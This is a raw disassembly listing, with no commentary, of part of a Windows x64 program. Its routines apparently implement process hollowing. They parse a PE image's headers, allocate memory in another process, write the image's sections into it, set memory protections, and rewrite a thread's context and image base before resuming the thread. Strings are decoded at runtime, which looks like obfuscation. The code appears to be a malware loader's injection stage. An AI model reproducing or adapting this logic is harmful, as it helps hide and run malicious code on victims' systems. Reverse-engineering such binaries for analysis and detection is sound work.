   140003440:	4c 89 f1             	mov    %r14,%rcx
   140003443:	31 d2                	xor    %edx,%edx
   140003445:	e8 96 72 00 00       	call   0x14000a6e0
   14000344a:	80 3d 2c ce 2b 00 00 	cmpb   $0x0,0x2bce2c(%rip)        # 0x1402c027d
   140003451:	0f 84 24 01 00 00    	je     0x14000357b
   140003457:	80 3d 34 cf 2b 00 00 	cmpb   $0x0,0x2bcf34(%rip)        # 0x1402c0392
   14000345e:	74 33                	je     0x140003493
   140003460:	f3 0f 7e 05 20 cf 2b 	movq   0x2bcf20(%rip),%xmm0        # 0x1402c0388
   140003467:	00 
   140003468:	66 0f fd c7          	paddw  %xmm7,%xmm0
   14000346c:	66 41 0f db c0       	pand   %xmm8,%xmm0
   140003471:	66 0f d6 05 0f cf 2b 	movq   %xmm0,0x2bcf0f(%rip)        # 0x1402c0388
   140003478:	00 
   140003479:	8b 05 11 cf 2b 00    	mov    0x2bcf11(%rip),%eax        # 0x1402c0390
   14000347f:	83 c0 13             	add    $0x13,%eax
   140003482:	0f b6 c0             	movzbl %al,%eax
   140003485:	66 89 05 04 cf 2b 00 	mov    %ax,0x2bcf04(%rip)        # 0x1402c0390
   14000348c:	c6 05 ff ce 2b 00 00 	movb   $0x0,0x2bceff(%rip)        # 0x1402c0392
   140003493:	4c 89 f1             	mov    %r14,%rcx
   140003496:	48 8d 15 eb ce 2b 00 	lea    0x2bceeb(%rip),%rdx        # 0x1402c0388
   14000349d:	e8 4e 71 00 00       	call   0x14000a5f0
   1400034a2:	4c 89 f1             	mov    %r14,%rcx
   1400034a5:	4c 89 e2             	mov    %r12,%rdx
   1400034a8:	e8 33 71 00 00       	call   0x14000a5e0
   1400034ad:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
   1400034b4:	00 00 
   1400034b6:	4c 89 f1             	mov    %r14,%rcx
   1400034b9:	e8 42 71 00 00       	call   0x14000a600
   1400034be:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   1400034c5:	01 c0                	add    %eax,%eax
   1400034c7:	66 89 4c 24 62       	mov    %cx,0x62(%rsp)
   1400034cc:	66 89 44 24 60       	mov    %ax,0x60(%rsp)
   1400034d1:	4c 89 74 24 68       	mov    %r14,0x68(%rsp)
   1400034d6:	0f 29 b4 24 80 00 00 	movaps %xmm6,0x80(%rsp)
   1400034dd:	00 
   1400034de:	0f 29 b4 24 90 00 00 	movaps %xmm6,0x90(%rsp)
   1400034e5:	00 
   1400034e6:	c7 84 24 80 00 00 00 	movl   $0x30,0x80(%rsp)
   1400034ed:	30 00 00 00 
   1400034f1:	c7 84 24 98 00 00 00 	movl   $0x40,0x98(%rsp)
   1400034f8:	40 00 00 00 
   1400034fc:	48 89 bc 24 90 00 00 	mov    %rdi,0x90(%rsp)
   140003503:	00 
   140003504:	48 8d 84 24 a0 00 00 	lea    0xa0(%rsp),%rax
   14000350b:	00 
   14000350c:	0f 11 30             	movups %xmm6,(%rax)
   14000350f:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%rsp)
   140003516:	00 
   140003517:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   14000351e:	00 00 
   140003520:	c7 44 24 40 01 00 00 	movl   $0x1,0x40(%rsp)
   140003527:	00 
   140003528:	c7 44 24 38 03 00 00 	movl   $0x3,0x38(%rsp)
   14000352f:	00 
   140003530:	c7 44 24 30 00 00 00 	movl   $0x0,0x30(%rsp)
   140003537:	00 
   140003538:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   14000353f:	00 
   140003540:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003547:	00 00 
   140003549:	4c 89 e9             	mov    %r13,%rcx
   14000354c:	ba 16 01 12 00       	mov    $0x120116,%edx
   140003551:	49 89 e8             	mov    %rbp,%r8
   140003554:	49 89 f1             	mov    %rsi,%r9
   140003557:	e8 c6 de ff ff       	call   0x140001422
   14000355c:	85 c0                	test   %eax,%eax
   14000355e:	78 0a                	js     0x14000356a
   140003560:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   140003565:	e8 f4 de ff ff       	call   0x14000145e
   14000356a:	42 0f b7 44 3b 02    	movzwl 0x2(%rbx,%r15,1),%eax
   140003570:	66 85 c0             	test   %ax,%ax
   140003573:	0f 85 9d fe ff ff    	jne    0x140003416
   140003579:	eb 46                	jmp    0x1400035c1
   14000357b:	c6 05 10 ce 2b 00 01 	movb   $0x1,0x2bce10(%rip)        # 0x1402c0392
   140003582:	48 b8 49 00 2c 00 2c 	movabs $0x49002c002c0049,%rax
   140003589:	00 49 00 
   14000358c:	48 89 05 f5 cd 2b 00 	mov    %rax,0x2bcdf5(%rip)        # 0x1402c0388
   140003593:	66 c7 05 f4 cd 2b 00 	movw   $0xed,0x2bcdf4(%rip)        # 0x1402c0390
   14000359a:	ed 00 
   14000359c:	48 8d 0d 5d 02 00 00 	lea    0x25d(%rip),%rcx        # 0x140003800
   1400035a3:	e8 c8 dd ff ff       	call   0x140001370
   1400035a8:	c6 05 ce cc 2b 00 01 	movb   $0x1,0x2bccce(%rip)        # 0x1402c027d
   1400035af:	80 3d dc cd 2b 00 00 	cmpb   $0x0,0x2bcddc(%rip)        # 0x1402c0392
   1400035b6:	0f 85 a4 fe ff ff    	jne    0x140003460
   1400035bc:	e9 d2 fe ff ff       	jmp    0x140003493
   1400035c1:	48 8d b4 24 e0 02 00 	lea    0x2e0(%rsp),%rsi
   1400035c8:	00 
   1400035c9:	41 b8 10 02 00 00    	mov    $0x210,%r8d
   1400035cf:	48 89 f1             	mov    %rsi,%rcx
   1400035d2:	31 d2                	xor    %edx,%edx
   1400035d4:	e8 07 71 00 00       	call   0x14000a6e0
   1400035d9:	80 3d 98 cc 2b 00 00 	cmpb   $0x0,0x2bcc98(%rip)        # 0x1402c0278
   1400035e0:	0f 84 ae 01 00 00    	je     0x140003794
   1400035e6:	80 3d d5 cc 2b 00 00 	cmpb   $0x0,0x2bccd5(%rip)        # 0x1402c02c2
   1400035ed:	74 3c                	je     0x14000362b
   1400035ef:	f3 0f 7e 05 c1 cc 2b 	movq   0x2bccc1(%rip),%xmm0        # 0x1402c02b8
   1400035f6:	00 
   1400035f7:	66 0f fd 05 01 80 00 	paddw  0x8001(%rip),%xmm0        # 0x14000b600
   1400035fe:	00 
   1400035ff:	66 0f db 05 e9 7f 00 	pand   0x7fe9(%rip),%xmm0        # 0x14000b5f0
   140003606:	00 
   140003607:	66 0f d6 05 a9 cc 2b 	movq   %xmm0,0x2bcca9(%rip)        # 0x1402c02b8
   14000360e:	00 
   14000360f:	b8 cf 00 00 00       	mov    $0xcf,%eax
   140003614:	03 05 a6 cc 2b 00    	add    0x2bcca6(%rip),%eax        # 0x1402c02c0
   14000361a:	0f b6 c0             	movzbl %al,%eax
   14000361d:	66 89 05 9c cc 2b 00 	mov    %ax,0x2bcc9c(%rip)        # 0x1402c02c0
   140003624:	c6 05 97 cc 2b 00 00 	movb   $0x0,0x2bcc97(%rip)        # 0x1402c02c2
   14000362b:	48 8d 15 86 cc 2b 00 	lea    0x2bcc86(%rip),%rdx        # 0x1402c02b8
   140003632:	48 89 f1             	mov    %rsi,%rcx
   140003635:	e8 b6 6f 00 00       	call   0x14000a5f0
   14000363a:	48 89 f1             	mov    %rsi,%rcx
   14000363d:	48 89 da             	mov    %rbx,%rdx
   140003640:	e8 9b 6f 00 00       	call   0x14000a5e0
   140003645:	48 c7 84 24 80 00 00 	movq   $0x0,0x80(%rsp)
   14000364c:	00 00 00 00 00 
   140003651:	48 89 f1             	mov    %rsi,%rcx
   140003654:	e8 a7 6f 00 00       	call   0x14000a600
   140003659:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140003660:	01 c0                	add    %eax,%eax
   140003662:	66 89 8c 24 82 00 00 	mov    %cx,0x82(%rsp)
   140003669:	00 
   14000366a:	66 89 84 24 80 00 00 	mov    %ax,0x80(%rsp)
   140003671:	00 
   140003672:	48 89 b4 24 88 00 00 	mov    %rsi,0x88(%rsp)
   140003679:	00 
   14000367a:	0f 57 f6             	xorps  %xmm6,%xmm6
   14000367d:	0f 29 b4 24 d0 00 00 	movaps %xmm6,0xd0(%rsp)
   140003684:	00 
   140003685:	0f 29 b4 24 e0 00 00 	movaps %xmm6,0xe0(%rsp)
   14000368c:	00 
   14000368d:	c7 84 24 d0 00 00 00 	movl   $0x30,0xd0(%rsp)
   140003694:	30 00 00 00 
   140003698:	c7 84 24 e8 00 00 00 	movl   $0x40,0xe8(%rsp)
   14000369f:	40 00 00 00 
   1400036a3:	48 8d 84 24 80 00 00 	lea    0x80(%rsp),%rax
   1400036aa:	00 
   1400036ab:	48 89 84 24 e0 00 00 	mov    %rax,0xe0(%rsp)
   1400036b2:	00 
   1400036b3:	0f 29 b4 24 f0 00 00 	movaps %xmm6,0xf0(%rsp)
   1400036ba:	00 
   1400036bb:	48 c7 44 24 60 00 00 	movq   $0x0,0x60(%rsp)
   1400036c2:	00 00 
   1400036c4:	0f 29 b4 24 b0 00 00 	movaps %xmm6,0xb0(%rsp)
   1400036cb:	00 
   1400036cc:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%rsp)
   1400036d3:	00 
   1400036d4:	48 c7 44 24 48 00 00 	movq   $0x0,0x48(%rsp)
   1400036db:	00 00 
   1400036dd:	c7 44 24 40 20 00 00 	movl   $0x20,0x40(%rsp)
   1400036e4:	00 
   1400036e5:	c7 44 24 38 00 00 00 	movl   $0x0,0x38(%rsp)
   1400036ec:	00 
   1400036ed:	c7 44 24 30 03 00 00 	movl   $0x3,0x30(%rsp)
   1400036f4:	00 
   1400036f5:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   1400036fc:	00 
   1400036fd:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003704:	00 00 
   140003706:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   14000370b:	4c 8d 84 24 d0 00 00 	lea    0xd0(%rsp),%r8
   140003712:	00 
   140003713:	48 8d b4 24 b0 00 00 	lea    0xb0(%rsp),%rsi
   14000371a:	00 
   14000371b:	ba 00 00 11 c0       	mov    $0xc0110000,%edx
   140003720:	49 89 f1             	mov    %rsi,%r9
   140003723:	e8 fa dc ff ff       	call   0x140001422
   140003728:	85 c0                	test   %eax,%eax
   14000372a:	78 3b                	js     0x140003767
   14000372c:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140003731:	0f 11 74 24 38       	movups %xmm6,0x38(%rsp)
   140003736:	8b 44 24 74          	mov    0x74(%rsp),%eax
   14000373a:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000373e:	48 8b 84 24 c8 00 00 	mov    0xc8(%rsp),%rax
   140003745:	00 
   140003746:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000374b:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140003750:	31 d2                	xor    %edx,%edx
   140003752:	45 31 c0             	xor    %r8d,%r8d
   140003755:	45 31 c9             	xor    %r9d,%r9d
   140003758:	e8 d4 dc ff ff       	call   0x140001431
   14000375d:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140003762:	e8 f7 dc ff ff       	call   0x14000145e
   140003767:	0f 28 b4 24 f0 04 00 	movaps 0x4f0(%rsp),%xmm6
   14000376e:	00 
   14000376f:	0f 28 bc 24 00 05 00 	movaps 0x500(%rsp),%xmm7
   140003776:	00 
   140003777:	44 0f 28 84 24 10 05 	movaps 0x510(%rsp),%xmm8
   14000377e:	00 00 
   140003780:	48 81 c4 28 05 00 00 	add    $0x528,%rsp
   140003787:	5b                   	pop    %rbx
   140003788:	5d                   	pop    %rbp
   140003789:	5f                   	pop    %rdi
   14000378a:	5e                   	pop    %rsi
   14000378b:	41 5c                	pop    %r12
   14000378d:	41 5d                	pop    %r13
   14000378f:	41 5e                	pop    %r14
   140003791:	41 5f                	pop    %r15
   140003793:	c3                   	ret
   140003794:	c6 05 27 cb 2b 00 01 	movb   $0x1,0x2bcb27(%rip)        # 0x1402c02c2
   14000379b:	48 b8 8d 00 70 00 70 	movabs $0x8d00700070008d,%rax
   1400037a2:	00 8d 00 
   1400037a5:	48 89 05 0c cb 2b 00 	mov    %rax,0x2bcb0c(%rip)        # 0x1402c02b8
   1400037ac:	66 c7 05 0b cb 2b 00 	movw   $0x31,0x2bcb0b(%rip)        # 0x1402c02c0
   1400037b3:	31 00 
   1400037b5:	48 8d 0d 24 00 00 00 	lea    0x24(%rip),%rcx        # 0x1400037e0
   1400037bc:	e8 af db ff ff       	call   0x140001370
   1400037c1:	c6 05 b0 ca 2b 00 01 	movb   $0x1,0x2bcab0(%rip)        # 0x1402c0278
   1400037c8:	80 3d f3 ca 2b 00 00 	cmpb   $0x0,0x2bcaf3(%rip)        # 0x1402c02c2
   1400037cf:	0f 85 1a fe ff ff    	jne    0x1400035ef
   1400037d5:	e9 51 fe ff ff       	jmp    0x14000362b
   1400037da:	cc                   	int3
   1400037db:	cc                   	int3
   1400037dc:	cc                   	int3
   1400037dd:	cc                   	int3
   1400037de:	cc                   	int3
   1400037df:	cc                   	int3
   1400037e0:	66 c7 05 d7 ca 2b 00 	movw   $0x0,0x2bcad7(%rip)        # 0x1402c02c0
   1400037e7:	00 00 
   1400037e9:	48 c7 05 c4 ca 2b 00 	movq   $0x0,0x2bcac4(%rip)        # 0x1402c02b8
   1400037f0:	00 00 00 00 
   1400037f4:	c3                   	ret
   1400037f5:	cc                   	int3
   1400037f6:	cc                   	int3
   1400037f7:	cc                   	int3
   1400037f8:	cc                   	int3
   1400037f9:	cc                   	int3
   1400037fa:	cc                   	int3
   1400037fb:	cc                   	int3
   1400037fc:	cc                   	int3
   1400037fd:	cc                   	int3
   1400037fe:	cc                   	int3
   1400037ff:	cc                   	int3
   140003800:	66 c7 05 87 cb 2b 00 	movw   $0x0,0x2bcb87(%rip)        # 0x1402c0390
   140003807:	00 00 
   140003809:	48 c7 05 74 cb 2b 00 	movq   $0x0,0x2bcb74(%rip)        # 0x1402c0388
   140003810:	00 00 00 00 
   140003814:	c3                   	ret
   140003815:	cc                   	int3
   140003816:	cc                   	int3
   140003817:	cc                   	int3
   140003818:	cc                   	int3
   140003819:	cc                   	int3
   14000381a:	cc                   	int3
   14000381b:	cc                   	int3
   14000381c:	cc                   	int3
   14000381d:	cc                   	int3
   14000381e:	cc                   	int3
   14000381f:	cc                   	int3
   140003820:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003823:	0f 11 05 20 cb 2b 00 	movups %xmm0,0x2bcb20(%rip)        # 0x1402c034a
   14000382a:	0f 29 05 0f cb 2b 00 	movaps %xmm0,0x2bcb0f(%rip)        # 0x1402c0340
   140003831:	0f 29 05 f8 ca 2b 00 	movaps %xmm0,0x2bcaf8(%rip)        # 0x1402c0330
   140003838:	0f 29 05 e1 ca 2b 00 	movaps %xmm0,0x2bcae1(%rip)        # 0x1402c0320
   14000383f:	0f 29 05 ca ca 2b 00 	movaps %xmm0,0x2bcaca(%rip)        # 0x1402c0310
   140003846:	0f 29 05 b3 ca 2b 00 	movaps %xmm0,0x2bcab3(%rip)        # 0x1402c0300
   14000384d:	0f 29 05 9c ca 2b 00 	movaps %xmm0,0x2bca9c(%rip)        # 0x1402c02f0
   140003854:	0f 29 05 85 ca 2b 00 	movaps %xmm0,0x2bca85(%rip)        # 0x1402c02e0
   14000385b:	c3                   	ret
   14000385c:	cc                   	int3
   14000385d:	cc                   	int3
   14000385e:	cc                   	int3
   14000385f:	cc                   	int3
   140003860:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003863:	0f 29 05 f6 ca 2b 00 	movaps %xmm0,0x2bcaf6(%rip)        # 0x1402c0360
   14000386a:	c7 05 fc ca 2b 00 00 	movl   $0x0,0x2bcafc(%rip)        # 0x1402c0370
   140003871:	00 00 00 
   140003874:	c3                   	ret
   140003875:	cc                   	int3
   140003876:	cc                   	int3
   140003877:	cc                   	int3
   140003878:	cc                   	int3
   140003879:	cc                   	int3
   14000387a:	cc                   	int3
   14000387b:	cc                   	int3
   14000387c:	cc                   	int3
   14000387d:	cc                   	int3
   14000387e:	cc                   	int3
   14000387f:	cc                   	int3
   140003880:	c7 05 f6 ca 2b 00 00 	movl   $0x0,0x2bcaf6(%rip)        # 0x1402c0380
   140003887:	00 00 00 
   14000388a:	48 c7 05 e3 ca 2b 00 	movq   $0x0,0x2bcae3(%rip)        # 0x1402c0378
   140003891:	00 00 00 00 
   140003895:	c3                   	ret
   140003896:	cc                   	int3
   140003897:	cc                   	int3
   140003898:	cc                   	int3
   140003899:	cc                   	int3
   14000389a:	cc                   	int3
   14000389b:	cc                   	int3
   14000389c:	cc                   	int3
   14000389d:	cc                   	int3
   14000389e:	cc                   	int3
   14000389f:	cc                   	int3
   1400038a0:	66 c7 05 c7 e4 2b 00 	movw   $0x0,0x2be4c7(%rip)        # 0x1402c1d70
   1400038a7:	00 00 
   1400038a9:	48 c7 05 b4 e4 2b 00 	movq   $0x0,0x2be4b4(%rip)        # 0x1402c1d68
   1400038b0:	00 00 00 00 
   1400038b4:	c3                   	ret
   1400038b5:	cc                   	int3
   1400038b6:	cc                   	int3
   1400038b7:	cc                   	int3
   1400038b8:	cc                   	int3
   1400038b9:	cc                   	int3
   1400038ba:	cc                   	int3
   1400038bb:	cc                   	int3
   1400038bc:	cc                   	int3
   1400038bd:	cc                   	int3
   1400038be:	cc                   	int3
   1400038bf:	cc                   	int3
   1400038c0:	66 c7 05 07 ca 2b 00 	movw   $0x0,0x2bca07(%rip)        # 0x1402c02d0
   1400038c7:	00 00 
   1400038c9:	48 c7 05 f4 c9 2b 00 	movq   $0x0,0x2bc9f4(%rip)        # 0x1402c02c8
   1400038d0:	00 00 00 00 
   1400038d4:	c3                   	ret
   1400038d5:	cc                   	int3
   1400038d6:	cc                   	int3
   1400038d7:	cc                   	int3
   1400038d8:	cc                   	int3
   1400038d9:	cc                   	int3
   1400038da:	cc                   	int3
   1400038db:	cc                   	int3
   1400038dc:	cc                   	int3
   1400038dd:	cc                   	int3
   1400038de:	cc                   	int3
   1400038df:	cc                   	int3
   1400038e0:	56                   	push   %rsi
   1400038e1:	57                   	push   %rdi
   1400038e2:	48 81 ec 88 00 00 00 	sub    $0x88,%rsp
   1400038e9:	48 89 d6             	mov    %rdx,%rsi
   1400038ec:	48 89 cf             	mov    %rcx,%rdi
   1400038ef:	48 c7 44 24 40 00 00 	movq   $0x0,0x40(%rsp)
   1400038f6:	00 00 
   1400038f8:	e8 03 6d 00 00       	call   0x14000a600
   1400038fd:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   140003904:	01 c0                	add    %eax,%eax
   140003906:	66 89 4c 24 42       	mov    %cx,0x42(%rsp)
   14000390b:	66 89 44 24 40       	mov    %ax,0x40(%rsp)
   140003910:	48 89 7c 24 48       	mov    %rdi,0x48(%rsp)
   140003915:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003918:	0f 29 44 24 50       	movaps %xmm0,0x50(%rsp)
   14000391d:	0f 29 44 24 60       	movaps %xmm0,0x60(%rsp)
   140003922:	c7 44 24 50 30 00 00 	movl   $0x30,0x50(%rsp)
   140003929:	00 
   14000392a:	c7 44 24 68 40 00 00 	movl   $0x40,0x68(%rsp)
   140003931:	00 
   140003932:	48 8d 44 24 40       	lea    0x40(%rsp),%rax
   140003937:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   14000393c:	0f 29 44 24 70       	movaps %xmm0,0x70(%rsp)
   140003941:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
   140003948:	00 00 
   14000394a:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   14000394f:	4c 8d 44 24 50       	lea    0x50(%rsp),%r8
   140003954:	ba 06 00 03 00       	mov    $0x30006,%edx
   140003959:	e8 1d dc ff ff       	call   0x14000157b
   14000395e:	85 c0                	test   %eax,%eax
   140003960:	78 42                	js     0x1400039a4
   140003962:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   140003969:	00 00 
   14000396b:	48 89 f1             	mov    %rsi,%rcx
   14000396e:	e8 8d 6c 00 00       	call   0x14000a600
   140003973:	8d 0c 45 02 00 00 00 	lea    0x2(,%rax,2),%ecx
   14000397a:	01 c0                	add    %eax,%eax
   14000397c:	66 89 4c 24 32       	mov    %cx,0x32(%rsp)
   140003981:	66 89 44 24 30       	mov    %ax,0x30(%rsp)
   140003986:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   14000398b:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   140003990:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140003995:	e8 1d dc ff ff       	call   0x1400015b7
   14000399a:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   14000399f:	e8 ba da ff ff       	call   0x14000145e
   1400039a4:	90                   	nop
   1400039a5:	48 81 c4 88 00 00 00 	add    $0x88,%rsp
   1400039ac:	5f                   	pop    %rdi
   1400039ad:	5e                   	pop    %rsi
   1400039ae:	c3                   	ret
   1400039af:	cc                   	int3
   1400039b0:	41 57                	push   %r15
   1400039b2:	41 56                	push   %r14
   1400039b4:	41 55                	push   %r13
   1400039b6:	41 54                	push   %r12
   1400039b8:	56                   	push   %rsi
   1400039b9:	57                   	push   %rdi
   1400039ba:	55                   	push   %rbp
   1400039bb:	53                   	push   %rbx
   1400039bc:	48 81 ec 48 05 00 00 	sub    $0x548,%rsp
   1400039c3:	4c 89 ce             	mov    %r9,%rsi
   1400039c6:	48 89 d0             	mov    %rdx,%rax
   1400039c9:	48 89 ca             	mov    %rcx,%rdx
   1400039cc:	4c 8b 8c 24 b0 05 00 	mov    0x5b0(%rsp),%r9
   1400039d3:	00 
   1400039d4:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   1400039d9:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   1400039e0:	00 
   1400039e1:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   1400039e6:	49 89 c0             	mov    %rax,%r8
   1400039e9:	e8 a2 ec ff ff       	call   0x140002690
   1400039ee:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   1400039f3:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   1400039f7:	0f 84 07 02 00 00    	je     0x140003c04
   1400039fd:	4c 63 7e 3c          	movslq 0x3c(%rsi),%r15
   140003a01:	4a 8b 44 3e 30       	mov    0x30(%rsi,%r15,1),%rax
   140003a06:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140003a0b:	42 8b 44 3e 50       	mov    0x50(%rsi,%r15,1),%eax
   140003a10:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140003a15:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   140003a1c:	00 
   140003a1d:	c7 44 24 20 00 30 00 	movl   $0x3000,0x20(%rsp)
   140003a24:	00 
   140003a25:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   140003a2a:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   140003a2f:	45 31 c0             	xor    %r8d,%r8d
   140003a32:	e8 72 da ff ff       	call   0x1400014a9
   140003a37:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003a3c:	85 c0                	test   %eax,%eax
   140003a3e:	0f 88 b9 01 00 00    	js     0x140003bfd
   140003a44:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   140003a49:	46 8b 4c 3e 54       	mov    0x54(%rsi,%r15,1),%r9d
   140003a4e:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003a55:	00 00 
   140003a57:	49 89 f0             	mov    %rsi,%r8
   140003a5a:	e8 59 da ff ff       	call   0x1400014b8
   140003a5f:	66 42 83 7c 3e 06 00 	cmpw   $0x0,0x6(%rsi,%r15,1)
   140003a66:	0f 84 eb 00 00 00    	je     0x140003b57
   140003a6c:	48 b8 df 6b 05 ab af 	movabs $0x7d0149afab056bdf,%rax
   140003a73:	49 01 7d 
   140003a76:	4d 8d 2c 37          	lea    (%r15,%rsi,1),%r13
   140003a7a:	49 81 c5 10 01 00 00 	add    $0x110,%r13
   140003a81:	31 ed                	xor    %ebp,%ebp
   140003a83:	48 8d 78 02          	lea    0x2(%rax),%rdi
   140003a87:	48 8d 58 1e          	lea    0x1e(%rax),%rbx
   140003a8b:	4c 8d 60 3e          	lea    0x3e(%rax),%r12
   140003a8f:	eb 23                	jmp    0x140003ab4
   140003a91:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140003a98:	0f 1f 84 00 00 00 00 
   140003a9f:	00 
   140003aa0:	ff c5                	inc    %ebp
   140003aa2:	42 0f b7 44 3e 06    	movzwl 0x6(%rsi,%r15,1),%eax
   140003aa8:	49 83 c5 28          	add    $0x28,%r13
   140003aac:	39 c5                	cmp    %eax,%ebp
   140003aae:	0f 83 a3 00 00 00    	jae    0x140003b57
   140003ab4:	41 8b 45 1c          	mov    0x1c(%r13),%eax
   140003ab8:	85 c0                	test   %eax,%eax
   140003aba:	48 89 f9             	mov    %rdi,%rcx
   140003abd:	48 ba df 6b 05 ab af 	movabs $0x7d0149afab056bdf,%rdx
   140003ac4:	49 01 7d 
   140003ac7:	48 0f 49 ca          	cmovns %rdx,%rcx
   140003acb:	4d 89 e6             	mov    %r12,%r14
   140003ace:	4c 0f 49 f3          	cmovns %rbx,%r14
   140003ad2:	a9 00 00 00 20       	test   $0x20000000,%eax
   140003ad7:	4c 0f 44 f1          	cmove  %rcx,%r14
   140003adb:	48 b8 23 94 fa 54 50 	movabs $0x82feb65054fa9423,%rax
   140003ae2:	b6 fe 82 
   140003ae5:	49 01 c6             	add    %rax,%r14
   140003ae8:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003aed:	41 8b 55 04          	mov    0x4(%r13),%edx
   140003af1:	45 8b 4d 08          	mov    0x8(%r13),%r9d
   140003af5:	48 03 54 24 38       	add    0x38(%rsp),%rdx
   140003afa:	45 8b 45 0c          	mov    0xc(%r13),%r8d
   140003afe:	49 01 f0             	add    %rsi,%r8
   140003b01:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003b08:	00 00 
   140003b0a:	e8 a9 d9 ff ff       	call   0x1400014b8
   140003b0f:	44 89 f0             	mov    %r14d,%eax
   140003b12:	83 e0 fe             	and    $0xfffffffe,%eax
   140003b15:	83 f8 04             	cmp    $0x4,%eax
   140003b18:	74 86                	je     0x140003aa0
   140003b1a:	41 8b 45 04          	mov    0x4(%r13),%eax
   140003b1e:	48 03 44 24 38       	add    0x38(%rsp),%rax
   140003b23:	48 89 44 24 70       	mov    %rax,0x70(%rsp)
   140003b28:	41 8b 45 00          	mov    0x0(%r13),%eax
   140003b2c:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140003b31:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003b36:	48 8d 44 24 6c       	lea    0x6c(%rsp),%rax
   140003b3b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003b40:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140003b45:	4c 8d 44 24 58       	lea    0x58(%rsp),%r8
   140003b4a:	45 89 f1             	mov    %r14d,%r9d
   140003b4d:	e8 83 da ff ff       	call   0x1400015d5
   140003b52:	e9 49 ff ff ff       	jmp    0x140003aa0
   140003b57:	48 8d 7c 24 70       	lea    0x70(%rsp),%rdi
   140003b5c:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   140003b62:	48 89 f9             	mov    %rdi,%rcx
   140003b65:	31 d2                	xor    %edx,%edx
   140003b67:	e8 74 6b 00 00       	call   0x14000a6e0
   140003b6c:	c7 84 24 a0 00 00 00 	movl   $0x100002,0xa0(%rsp)
   140003b73:	02 00 10 00 
   140003b77:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003b7c:	48 89 fa             	mov    %rdi,%rdx
   140003b7f:	e8 07 d9 ff ff       	call   0x14000148b
   140003b84:	85 c0                	test   %eax,%eax
   140003b86:	78 70                	js     0x140003bf8
   140003b88:	42 8b 44 3e 28       	mov    0x28(%rsi,%r15,1),%eax
   140003b8d:	48 03 44 24 38       	add    0x38(%rsp),%rax
   140003b92:	48 89 84 24 f0 00 00 	mov    %rax,0xf0(%rsp)
   140003b99:	00 
   140003b9a:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003b9f:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140003ba4:	e8 f1 d8 ff ff       	call   0x14000149a
   140003ba9:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140003bae:	85 c0                	test   %eax,%eax
   140003bb0:	78 4b                	js     0x140003bfd
   140003bb2:	48 8b 94 24 f8 00 00 	mov    0xf8(%rsp),%rdx
   140003bb9:	00 
   140003bba:	48 83 c2 10          	add    $0x10,%rdx
   140003bbe:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003bc5:	00 00 
   140003bc7:	4c 8d 44 24 38       	lea    0x38(%rsp),%r8
   140003bcc:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   140003bd2:	e8 e1 d8 ff ff       	call   0x1400014b8
   140003bd7:	85 c0                	test   %eax,%eax
   140003bd9:	78 1d                	js     0x140003bf8
   140003bdb:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003be0:	31 d2                	xor    %edx,%edx
   140003be2:	e8 95 d8 ff ff       	call   0x14000147c
   140003be7:	48 8b 4c 24 48       	mov    0x48(%rsp),%rcx
   140003bec:	e8 6d d8 ff ff       	call   0x14000145e
